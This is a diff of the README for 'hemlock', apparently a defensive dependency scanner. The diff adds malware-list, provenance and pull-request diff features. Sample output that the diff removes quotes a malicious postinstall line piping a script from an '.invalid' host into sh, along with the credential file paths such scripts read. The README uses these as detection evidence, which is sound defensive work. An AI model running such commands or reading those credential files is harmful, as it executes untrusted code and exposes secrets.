@@ -1,6 +1,12 @@
 <div align="center">
 
-# hemlock
+```
+██  ██  ██████  ██      ██  ██      ██████  ██████  ██    ██
+██  ██  ██      ████  ████  ██      ██  ██  ██      ██  ██
+██████  ████    ██  ██  ██  ██      ██  ██  ██      ████
+██  ██  ██      ██      ██  ██      ██  ██  ██      ██  ██
+██  ██  ██████  ██      ██  ██████  ██████  ██████  ██    ██
+```
 
 **Poison hemlock looks like parsley.**
 
@@ -40,33 +46,34 @@ already public and free.
 ## What it looks like
 
 ```
-  hemlock ──────────────────────────────  12 packages · 2 manifests · offline
+  hemlock ─────────────────────────────────────  2 packages · 1 manifests · online
 
-  2 packages read credentials from an install script.
+   MALWARE
+  chalk@5.6.1 is on a public malware list. Remove it, then rotate every
+  credential the install could reach.
 
-  ●  100  npm   colorz 1.0.4                                        critical
-     ├ HEM204  Install script touches credentials
-     │         postinstall references .ssh/id_, AWS_SECRET, id_rsa, ~/.ssh
-     ├ HEM202  Install script downloads and executes
-     │         postinstall: curl -s https://cdn.example.invalid/setup.sh | sh
-     ├ HEM101  Name is a near-miss of a popular package
-     │         1 edit away from "colors"
-     └ HEM201  Runs a script at install time
-               postinstall: curl -s https://cdn.example.invalid/setup.sh | sh
-       install 75 + naming 30 = 105  ×1.25 (2 categories agree)  →  100
+  1 package is on a public malware list.
 
-  ●   82  npm   types-node 20.1.0                                       high
-     ├ HEM403  Resolved over plain HTTP
-     │         http://registry.internal.example.invalid/types-node-20.1.0.tgz
-     ├ HEM104  Unscoped copy of a scoped package name
-     │         resembles the scoped package "@types/node"
-     └ HEM402  Lockfile entry has no integrity hash
-               types-node@20.1.0 pinned without a hash
-       lockfile 38 + naming 28 = 66  ×1.25 (2 categories agree)  →  82
+  ●  MAL     npm   chalk 5.6.1                                            malware
+     ├ HEM701  This exact version is reported as malware
+     │         MAL-2025-46969 (GHSA-2v46-p5h4-248w): Malicious code in chalk (npm)
+     └ HEM601  Published without build provenance
+               published 2025-09-08 with no attestation on the registry
+       reported malicious, so no score was calculated
 
-  ▇▇▇▇▇▇▇░░░░░░░░░░  12 scanned · 2 critical · 2 high · 3 medium · 2 low
-  › hemlock explain HEM204   to read why any of these rules exist
+  ○   30     npm   express 4.18.2                                          medium
+     └ HEM702  Published advisory against this version
+               2 advisories: GHSA-qw6h-vgh9-j6wx, GHSA-rv95-896h-c2vc
+       intel 30 → 30
+       via  app-kit › build-tools › express
+       fix  Upgrade past the affected range. Look the ids up at osv.dev.
+
+  ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇  2 scanned · 1 critical · 1 medium
+  › hemlock explain HEM701   to read why any of these rules exist
 ```
+
+That is a real result, not a mockup. `chalk@5.6.1` is the version that shipped
+a crypto-address swapper in September 2025 after a maintainer was phished.
 
 Every finding shows the evidence that produced it, and every package shows the
 arithmetic behind its score. There is no model and no vendor feed. If you
@@ -87,10 +94,13 @@ pipx run hemlock-scan scan .
 ## Use
 
 ```bash
+hemlock init                      # write a config file and a CI workflow
 hemlock scan .                    # offline, fast, no network at all
-hemlock scan . --online           # add the registry trust checks
-hemlock scan . --format sarif     # for GitHub code scanning
-hemlock explain HEM502            # why a rule exists and what to do about it
+hemlock scan . --online           # add registry, provenance and OSV checks
+hemlock diff --since origin/main  # score only what a branch adds
+hemlock why left-pad              # who asked for this package
+hemlock baseline .                # accept today's findings, fail only on new ones
+hemlock explain HEM701            # why a rule exists and what to do about it
 hemlock rules                     # every check, with its weight
 ```
 
@@ -99,6 +109,83 @@ It finds its own work. Point it at a directory and it walks for
 `poetry.lock`, `Pipfile.lock` and `pyproject.toml`. If `node_modules` or a
 virtualenv is present it reads the installed source too, which is the only
 place real install scripts live.
+
+### Reviewing a change, not a codebase
+
+A full scan describes a repository. When you are reviewing a pull request you
+want the other thing: what did this change let in? Everything already in the
+lockfile was somebody else's decision, and re-reading all of it on every PR is
+how people learn to skim the output.
+
+```
+$ hemlock diff --since HEAD~1
+
+  hemlock diff ────────────────────  2 changed · 1 removed · 1 unchanged
+  HEAD~1 → working tree
+
+  1 package is a keystroke or two from one you probably meant.
+
+  ●   62  +  npm   colorz 1.0.4                                       high
+     ├ HEM101  Name is a near-miss of a popular package
+     │         1 edit away from "colors"
+     └ HEM402  Lockfile entry has no integrity hash
+               colorz@1.0.4 pinned without a hash
+       naming 30 + lockfile 20 = 50  ×1.25 (2 categories agree)  →  62
+
+  ·       ~  npm   chalk 5.6.1  (was 5.6.0)                 nothing flagged
+  ·       -  npm   left-pad                                         removed
+```
+
+`--since` takes any git ref. Two lockfile paths work too, for comparing
+artifacts that never shared a repository.
+
+### Adopting it on a codebase that already has a backlog
+
+Point a new scanner at an established project and it returns four hundred
+findings. Nobody triages four hundred findings, so the tool gets switched off,
+or wired into CI with the threshold set so high it never fires, which is the
+same thing with extra steps.
+
+```bash
+hemlock baseline .
+```
+
+That records what was true on the day you adopted it. From then on a scan
+reports only findings that are new, and a committed baseline applies
+automatically so CI stops failing on the backlog without anyone remembering a
+flag. The accepted findings are still counted in the summary, marked as known,
+and `--ignore-baseline` brings them all back.
+
+The fingerprint includes the version, so a dependency that moves re-raises
+everything about itself. Accepting a finding in March says nothing about the
+release that landed last night.
+
+### Who asked for this?
+
+Several rules end by telling you to work out which dependency pulled something
+in. That was poor advice from a tool that could not answer it.
+
+```
+$ hemlock why colorz
+
+  colorz 1.0.4  npm
+  package-lock.json
+
+  reached through
+    app-kit › build-tools › colorz
+
+  flagged
+    HEM101  Name is a near-miss of a popular package
+            1 edit away from "colors"
+
+  fix  Compare the name against what you meant to install, then find out which
+       dependency asked for it.
+```
+
+Routes are built from the lockfiles hemlock already read, following npm's own
+resolution order, so a nested copy of a package wins over a hoisted one.
+Transitive findings in the normal scan view carry the same route on a `via`
+line.
 
 ### The part worth trying first
 
@@ -129,7 +216,7 @@ ignore it. Every finding here ends with the command that explains itself.
 
 ## What it checks
 
-Twenty-three rules in five categories. Fifteen need no network.
+Twenty-five rules in seven categories. Fifteen need no network.
 
 Identity and naming, for packages pretending to be another one:
 
@@ -172,17 +259,68 @@ Registry trust, for what the registry already knows (needs `--online`):
 |---|---|---|
 | `HEM501` | This version was published very recently | 25 |
 | `HEM502` | Published by a different account than usual | 45 |
-| `HEM503` | Release is unsigned | 15 |
-| `HEM504` | Deprecated or withdrawn | 25 |
-| `HEM505` | Almost nobody installs this | 20 |
-| `HEM506` | No source repository | 15 |
-| `HEM507` | Known vulnerability reported for this version | 30 |
-| `HEM508` | Release size jumped sharply | 25 |
+| `HEM503` | Deprecated or withdrawn | 25 |
+| `HEM504` | Almost nobody installs this | 20 |
+| `HEM505` | No source repository | 15 |
+| `HEM506` | Release size jumped sharply | 25 |
 
-`HEM502` is the one to know about. npm records which account published each
-individual version, so an account takeover is visible in public metadata the
-moment it happens, before any advisory and before anyone unpacks the tarball.
-Nothing has to go wrong first for that signal to appear.
+Build provenance, for whether the artifact can be traced to source
+(needs `--online`):
+
+| | | |
+|---|---|---|
+| `HEM601` | Published without build provenance | 20 |
+| `HEM602` | Provenance points at a different repository | 55 |
+
+Public intelligence, for what somebody else has already established
+(needs `--online`):
+
+| | | |
+|---|---|---|
+| `HEM701` | This exact version is reported as malware | settles it |
+| `HEM702` | Published advisory against this version | 30 |
+
+### The three worth knowing about
+
+**`HEM502`** reads a field nobody looks at. npm records which account
+published each *individual version*, so an account takeover is visible in
+public metadata the moment it happens, before any advisory and before anyone
+unpacks the tarball. Nothing has to go wrong first for that signal to appear.
+
+**`HEM602`** compares the repository a package sends you to against the
+repository its signed attestation says it was actually built from. That is the
+shape of an attack that survives review: you read clean code in one place and
+install a build made somewhere else. Before attestations existed there was no
+way to notice.
+
+**`HEM701`** is the only rule that is not an inference. osv.dev aggregates the
+OpenSSF malicious-packages feed, which held roughly 226,000 records across npm
+and PyPI when this was written. If a record names the exact version installed,
+that is a report somebody wrote after analysing the package, so hemlock repeats
+it and stops scoring.
+
+It also checks whether the record still stands. In May 2026 OSV withdrew 157
+malware reports after an automated classifier raised them against trusted
+packages, and every tool that had already ingested them kept failing builds
+over nothing. hemlock skips withdrawn records.
+
+## Why provenance became a signal in 2026
+
+`HEM601` fires when a release has no attestation tying it to a repository, a
+workflow and a commit. That check would have been noise two years ago, because
+almost nothing had one.
+
+It is not noise now. npm began revoking classic publish tokens in December 2025
+and finished in early 2026, which leaves trusted publishing as the ordinary way
+to ship, and trusted publishing emits SLSA provenance automatically. PyPI has
+carried PEP 740 attestations since late 2024. A release made after those landed
+with nothing attached was published some other way.
+
+hemlock only applies the rule to releases published after 2025-01-01, since
+older ones predate the tooling and are not judged for it. The weight is low
+because a maintainer releasing from a laptop is ordinary. What it costs you is
+the ability to answer the next question, which is whether the tarball matches
+the tag.
 
 ## How the score works
 
@@ -206,7 +344,12 @@ install 75 + naming 30 = 105  ×1.25 (2 categories agree)  →  100 capped
 
 Bands: critical 85+, high 60 to 84, medium 30 to 59, low 1 to 29.
 
-Most rules are calibrated to be non-damning alone. `HEM201`, meaning the
+One rule opts out of all of it. `HEM701` reports a published finding rather
+than an inference of hemlock's own, so it settles the verdict at 100 by itself
+and the arithmetic has nothing useful to add. Malware is not a judgement call
+to be weighed against a missing integrity hash.
+
+Most other rules are calibrated to be non-damning alone. `HEM201`, meaning the
 package runs an install script, is weight 18, because thousands of honest
 packages compile native modules and `HEM201` on its own is not news. It matters
 when something else about the package is already odd, and the arithmetic is
@@ -214,8 +357,18 @@ built so that it only matters then.
 
 ## In CI
 
+`hemlock init` writes a workflow that does the right thing on both events, or
+you can write it yourself. Gate a pull request on what it introduces rather
+than on the whole tree:
+
 ```yaml
 - run: pipx install hemlock-scan
+- run: hemlock diff --since origin/${{ github.base_ref }} --online --fail-on high
+```
+
+Or scan everything on a schedule:
+
+```yaml
 - run: hemlock scan . --online --fail-on high
 ```
 
@@ -265,20 +418,24 @@ phished. The threat model includes hemlock.
 The same reasoning shapes the default. `hemlock scan` makes no network calls at
 all, so nothing about your dependency graph leaves the machine unless you ask
 for `--online`. That flag talks only to the public endpoints of
-`registry.npmjs.org` and `pypi.org`, with no account and no API key, and it
-sends no telemetry anywhere. Responses are cached under `~/.cache/hemlock` for
-six hours.
+`registry.npmjs.org`, `pypi.org` and `api.osv.dev`, with no account and no API
+key, and it sends no telemetry anywhere. Responses are cached under
+`~/.cache/hemlock` for six hours, and OSV takes one batched request for the
+whole dependency list rather than one per package.
 
 ## What this is not
 
 Worth being clear about, because the gaps are the interesting part.
 
-- It is not a CVE scanner. `HEM507` reports advisories because PyPI hands them
-  over for free, but that is a side effect. For thorough known-vulnerability
-  coverage use `osv-scanner`, `pip-audit` or `npm audit`. They answer a
-  different question and the two are complementary.
+- It is not a CVE scanner. `HEM702` reports advisories because the same OSV
+  request that finds malware returns them for free. For thorough
+  known-vulnerability coverage use `osv-scanner`, `pip-audit` or `npm audit`.
+  They answer a different question and the two are complementary.
 - It is not a sandbox. Every rule is static. Nothing is executed, and a
   sufficiently careful payload will not look like any of the patterns here.
+- It does not verify signatures. `HEM601` and `HEM602` read what the registry
+  publishes about an attestation; they do not check the Sigstore bundle
+  cryptographically. That is a real gap and it is on the roadmap.
 - It will produce false positives. Install scripts are common and normal, as
   are single-maintainer packages and recent releases. That is why nothing is
   called critical on one signal alone, and why suppressions are first-class.
@@ -294,12 +451,19 @@ Worth being clear about, because the gaps are the interesting part.
 hemlock/
   cli.py         argument parsing, exit codes
   scan.py        find manifests, resolve packages, run rules, score
+  diff.py        the same rules over only what a change added or moved
+  graph.py       who asked for a package, from the lockfiles already parsed
+  baseline.py    accepting what was already there
+  brand.py       the wordmark
   model.py       Package, Finding, Verdict, and the rule registry
   rules.py       every check, one function each
   score.py       the arithmetic above, and only that
   npm.py         package-lock, yarn.lock, package.json, node_modules
   pypi.py        requirements, poetry.lock, Pipfile.lock, pyproject
-  registry.py    the public registry lookups behind --online
+  http.py        one cached fetcher, shared by everything online
+  registry.py    npm and PyPI metadata
+  intel.py       OSV: malware reports and advisories, one batched call
+  provenance.py  SLSA and PEP 740 attestations, normalised to one shape
   policy.py      .hemlock.toml
   report.py      terminal, JSON, SARIF
   data.py        typosquat corpus, homoglyphs, credential paths
@@ -328,6 +492,11 @@ pip install -e ".[dev]"
 pytest -q
 ```
 
+No test touches the network. The online layer is exercised against a stub that
+serves canned registry and OSV documents, which is also where the awkward cases
+live: a withdrawn malware report, a repository URL written five different ways,
+an attestation payload that will not decode.
+
 `examples/compromised-app` is an inert project built to be caught. Every
 dependency in it is planted to trip a specific rule, the payloads are random
 characters, and the URLs point at `.invalid` domains that cannot resolve. CI
@@ -337,13 +506,13 @@ breaks the build instead of the next release. See
 
 ## Roadmap
 
+- Verify Sigstore bundles rather than trusting the registry's summary of them
 - Cargo and Go module support
-- `hemlock diff`, to score a lockfile change rather than a whole tree, so a
-  dependency bump can be reviewed on its own
-- Compare the published artifact against the tagged source, which is the gap
-  that both the `chalk` and `event-stream` compromises walked straight through
 - A cooldown policy: fail on any dependency published less than N days ago,
   which closes most of the account-takeover window on its own
+- Compare the published artifact against the tagged source. `HEM602` gets
+  close by checking which repository built it, but not yet whether the bytes
+  match what is in that repository
 
 ## License
 
